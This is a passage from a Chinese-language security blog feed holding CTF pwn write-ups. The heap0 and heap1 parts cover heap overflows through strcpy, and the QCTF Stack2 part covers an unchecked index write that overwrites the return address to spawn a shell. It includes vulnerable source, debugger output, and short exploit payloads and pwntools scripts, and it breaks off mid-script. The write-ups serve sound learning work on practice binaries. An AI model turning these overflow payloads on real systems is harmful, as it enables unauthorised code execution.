  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data is at %p, fp is at %p\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>d<span class="token operator">-></span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  f<span class="token operator">-></span><span class="token function">fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>编译命令 </p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gcc -m32 -fno-stack-protector -o heap0 heap0.c
</code></pre>
<p>可以检查下生成后的保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~/heap$ checksec heap0
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/heap/heap0'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre>
<p>我们通过ida进行分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>dest<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>
  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span>v4<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span>v5<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST18_4</span>

  dest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> v4<span class="token punctuation">;</span>
  <span class="token operator">*</span>v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>nowinner<span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data is at %p, fp is at %p\n"</span><span class="token punctuation">,</span> dest<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">(</span><span class="token operator">*</span>v5<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>漏洞存在于strcpy函数</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>因为该程序堆是连续分配的所以在内存结构上也是连续的</p>
<p> <img src="/2018/07/18/heap-学习/1.png" alt="1"></p>
<p>所以我们需要溢出dest覆盖到v4接着修改nowinner为winner函数地址</p>
<p>填充量= malloc(0x80u) +第二个chunk头0x8=136</p>
<p>或者gdb调试</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gef➤  <span class="token function">file</span> heap0
Reading symbols from heap0<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.
gef➤  pattern create 150
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Generating a pattern of 150 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Saved as <span class="token string">'<span class="token variable">$_gef0</span>'</span>
gef➤  r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
Starting program: /home/ubuntu/heap/heap0 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
data is at 0x804b008, fp is at 0x804b090

Program received signal SIGSEGV, Segmentation fault.
0x6261616a <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>
gef➤  pattern offset 0x6261616a
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Searching <span class="token string">'0x6261616a'</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Found at offset 136 <span class="token punctuation">(</span>little-endian search<span class="token punctuation">)</span> likely
gef➤
</code></pre>
<p>同样可以得到填充量</p>
<p>找到winner函数地址 0x80484CB</p>
<p>所以可以构造exp</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>heap0 `python <span class="token operator">-</span>c <span class="token string">"print 'a'*136+'\xCB\x84\x04\x08'"</span>`
</code></pre>
<p>这里有个小问题 用pwntools写的exp却无法利用 如果有大佬看到这篇文章 还求解答(已解决 如果你还没反应过来可以学习下argv[1]含义…感谢-SK-师傅指点 果然还是自己太差了 这里记录并且会继续努力下去)</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./heap0'</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span><span class="token operator">+</span><span class="token string">"\xCB\x84\x04\x08"</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">//</span> 错误展示<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre>
<h2 id="heap1"><a href="#heap1" class="headerlink" title="heap1"></a>heap1</h2><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>

<span class="token keyword">struct</span> internet <span class="token punctuation">{</span>
  <span class="token keyword">int</span> priority<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">struct</span> internet <span class="token operator">*</span>i1<span class="token punctuation">,</span> <span class="token operator">*</span>i2<span class="token punctuation">,</span> <span class="token operator">*</span>i3<span class="token punctuation">;</span>

  i1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> internet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  i1<span class="token operator">-></span>priority <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  i1<span class="token operator">-></span>name <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  i2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> internet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  i2<span class="token operator">-></span>priority <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
  i2<span class="token operator">-></span>name <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">strcpy</span><span class="token punctuation">(</span>i1<span class="token operator">-></span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>i2<span class="token operator">-></span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"and that's a wrap folks!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>编译命令</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">gcc <span class="token operator">-</span>m32 <span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector <span class="token operator">-</span>o heap1 heap1<span class="token punctuation">.</span>c
</code></pre>
<p>从源代码中可以看到,internet已经分配了两个结构，每个结构包含一个name单独分配的指针。这意味着 internet 在堆分配的struct将包含志强</p>
<p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~/heap$ checksec heap1
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ubuntu/heap/heap1'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre>
<p>只开启nx</p>
<p>我们通过ida来分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  _DWORD <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  _DWORD <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>
  _DWORD <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  _DWORD <span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST18_4</span>

  v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> v3<span class="token punctuation">;</span>
  <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> v5<span class="token punctuation">;</span>
  <span class="token operator">*</span>v5 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"and that's a wrap folks!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;heap0&quot;&gt;&lt;a href=&quot;#heap0&quot; class=&quot;headerlink&quot; title=&quot;heap0&quot;&gt;&lt;/a&gt;heap0&lt;/h2&gt;&lt;p&gt;源代码&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;c&quot; data-
    
    </summary>
    
    
      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
    
      <category term="heap" scheme="http://iosmosis.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>QCTF-writeup</title>
    <link href="http://iosmosis.github.io/2018/07/16/QCTF-writeup/"/>
    <id>http://iosmosis.github.io/2018/07/16/QCTF-writeup/</id>
    <published>2018-07-16T03:30:02.000Z</published>
    <updated>2019-07-18T09:32:48.877Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Stack2"><a href="#Stack2" class="headerlink" title="Stack2"></a>Stack2</h2><p>知识点</p>
<p>大小端序</p>
<p>大端模式（Big-endian）：高位字节排放在内存的低地址端，低位字节排放在内存的高地址端，即正序排列，高尾端；</p>
<p>小端模式（Little-endian）：低位字节排放在内存的低地址端，高位字节排放在内存的高地址端，即逆序排列，低尾端；</p>
<p>列子：</p>
<p>16bit宽的数0x1234在两种模式CPU内存中的存放方式（假设从地址0x4000开始存放）为：</p>
<table>
<thead>
<tr>
<th>内存地址</th>
<th>小端模式存放内容</th>
<th>大端存放模式</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x4000</td>
<td>0x34</td>
<td>0x12</td>
</tr>
<tr>
<td>0x4001</td>
<td>0x12</td>
<td>0x32</td>
</tr>
</tbody>
</table>
<p>32bit宽的数0x12345678在两种模式CPU内存中的存放方式（假设从地址0x4000开始存放）为：</p>
<table>
<thead>
<tr>
<th>内存地址</th>
<th>小端模式存放内容</th>
<th>大端存放模式</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x4000</td>
<td>0x78</td>
<td>0x12</td>
</tr>
<tr>
<td>0x4001</td>
<td>0x56</td>
<td>0x34</td>
</tr>
<tr>
<td>0x4002</td>
<td>0x34</td>
<td>0x56</td>
</tr>
<tr>
<td>0x4003</td>
<td>0x12</td>
<td>0x78</td>
</tr>
</tbody>
</table>
<p>首先checksec</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~/APwn/attack_word$ checksec stack2
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/APwn/attack_word/stack2'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
ios@ubuntu:~/APwn/attack_word$
</code></pre>
<p>开启 canary nx 32位</p>
<p>ida 分析函数</p>
<p>来看核心逻辑</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
           <span class="token keyword">break</span><span class="token punctuation">;</span>
         <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">&lt;=</span> <span class="token number">0x63</span> <span class="token punctuation">)</span>
         <span class="token punctuation">{</span>
           v3 <span class="token operator">=</span> j<span class="token operator">++</span><span class="token punctuation">;</span>
           v13<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
       <span class="token punctuation">}</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>
         <span class="token keyword">break</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
         <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
       <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"id\t\tnumber"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>
         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\t\t%d\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">,</span> v13<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
     v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span>
     <span class="token keyword">break</span><span class="token punctuation">;</span>
   v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
   <span class="token keyword">for</span> <span class="token punctuation">(</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span>
     v9 <span class="token operator">+</span><span class="token operator">=</span> v13<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre>
<p>注意change number处 未做验证id是否存在 而是直接赋值给v5接着使v13[v5]处的地址等于v7的地址</p>
<p>还给出了一个函数</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">hackhere</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>因为v5 v7可控所以可以通过控制v5到返回地址前4位从而达到写入恶意函数到返回地址处</p>
<p>查看可控v5距离ebp的偏移</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
<span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-90h]</span>
<span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-8Ch]</span>
<span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-88h]</span>
<span class="token keyword">unsigned</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-84h]</span>
</code></pre>
<p>可以看到j距离ebp的偏移 为0x84</p>
<p>所以向v13[0x84]处开始往后写即可覆盖return_addr</p>
<p>但是由于此处为int型参数所以传地址需要注意</p>
<p>需要利用小端序进行修改return_addr</p>
<p>exp：</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./stack2'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#p=remote('111.198.29.45',40850)</span>
offset<span class="token operator">=</span><span class="token number">0x84</span>

<span class="token keyword">def</span> <span class="token function">r</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>con<span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'5. exit\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'which number to change:\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'new number:\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>con<span class="token punctuation">)</span><span class="token punctuation">)</span>

log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'How many numbers you have:\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Give me your numbers\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
r<span class="token punctuation">(</span>offset<span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>
r<span class="token punctuation">(</span>offset<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">)</span>
r<span class="token punctuation">(</span>offset<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">)</span>
r<span class="token punctuation">(</span>offset<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">)</span>
offset<span class="token operator">+=</span><span class="token number">8</span>
r<span class="token punctuation">(</span>offset<span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">)</span>
